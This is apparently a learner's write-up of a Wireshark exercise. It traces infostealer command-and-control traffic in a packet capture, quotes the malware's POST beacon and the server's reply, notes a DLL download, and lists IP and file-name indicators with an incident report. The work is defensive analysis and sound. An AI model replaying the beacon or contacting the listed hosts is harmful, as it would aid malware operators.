# Task 3 — Wireshark Network Traffic Analysis

## What This Task Was About

I was given a packet capture file (`Example.pcap`) and had to open it in Wireshark, identify the suspicious connection, follow the full TCP stream to understand what the connection was doing, extract all Indicators of Compromise (IOCs), and write a formal incident report.

---

## Tool Used

**Wireshark** — a network protocol analyser used to inspect network packets and understand exactly what data is moving across a network.

---

## What I Did

### Step 1 — Opening the File and Starting Analysis

I opened `Example.pcap` in Wireshark. The capture had **28 packets total**. I started by applying a `tcp` filter to get an overview of the traffic, then narrowed it down with an `http` filter which brought it down to **4 HTTP packets**.

From there I used `http.request.method == "POST"` to isolate the suspicious outbound request — this immediately highlighted **packet 4**, a POST request being sent from the internal machine `10.41.30.54` to the external IP `37.220.87.68`.

### Step 2 — Following the TCP Stream

I right-clicked on the suspicious packet and selected **Follow > TCP Stream** to open the full connection content and see everything being sent and received.

The stream revealed the full conversation between the infected machine and the attacker's server:

**What the infected machine sent:**
```
POST / HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: B1D3N_RIM_MY_ASS
Host: 37.220.87.68
Content-Length: 95
Connection: Keep-Alive
Cache-Control: no-cache

machineId=5c20f0d5-4535-4643-91f7-7962d9485688|LENOVO&configId=23883deb102ef0839fbfe8fcef1a5fc7
```

**What the attacker's server responded:**
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 23 Mar 2023 10:49:07 GMT
```

Two things stood out immediately:

- The **User-Agent `B1D3N_RIM_MY_ASS`** — no legitimate software uses a user agent like this. This is custom malware.
- The **POST body sending a machine ID and config ID** — the malware was registering the infected device with the attacker's server.

The server's `200 OK` response confirmed the C2 communication was successful.

### Step 3 — Additional Finding

Back in the packet list, packet 17 showed the infected machine making a **GET request for `nss3.dll`** from the attacker's server. This DLL is used by infostealer malware to extract saved passwords from browsers — confirming this was a credential-stealing attack.

### Step 4 — Writing the Incident Report and IOC Table

Based on everything found in the TCP stream and the packet list, I compiled the full IOC table and wrote the incident report.

---

## IOC Table

| # | Type | Value |
|---|------|-------|
| 1 | IP Address | 37.220.87.68 |
| 2 | IP Address | 37.220.87.61 |
| 3 | IP Address | 77.73.134.35 |
| 4 | EXE file | Clip1.exe |
| 5 | EXE file | bebra.exe |
| 6 | DLL file | nss3.dll |
| 7 | DLL file | msvcp140.dll |
| 8 | DLL file | vcruntime140.dll |
| 9 | DLL file | mozglue.dll |
| 10 | DLL file | freebl3.dll |
| 11 | DLL file | softokn3.dll |
| 12 | DLL file | sqlite3.dll |

---

## Incident Report Summary

| Field | Value |
|-------|-------|
| Title | Suspicious network connection attempting to steal information |
| Category | Network hacking |
| Date of incident | Thu, 23 Mar 2023 10:49:07 GMT |
| Discovery date | April 2026 |
| Type | Incident |
| Source | Internal |

**Summary:** A suspicious connection was detected originating from an infostealer malware on an internal machine. After following the TCP stream, it was confirmed the malware was communicating with an attacker-controlled C2 server at `37.220.87.68`, sending device identifiers and attempting to download malicious DLL files to extract browser credentials, cryptocurrency wallet data, Telegram and Discord databases, and desktop files ending in `.txt`, `.dox`, and `.pdf`.

**Recommendations:**
- Block all identified IOC IPs at the firewall immediately
- Block the malicious EXE and DLL files by hash
- Scan the rest of the network for any other hosts communicating with the same IOCs
- Report the incident to the relevant authorities (Saudi Cybersecurity Authority — NCA)

---

## What I Learned

The task instructions were straightforward — open the file, find the suspicious connection, follow the TCP stream. But what made it click for me was seeing the User-Agent string `B1D3N_RIM_MY_ASS` in the raw packet data. That one field tells you immediately you're not dealing with normal traffic. Learning to read TCP streams and understand what malware is actually sending is a skill I didn't have before this task.
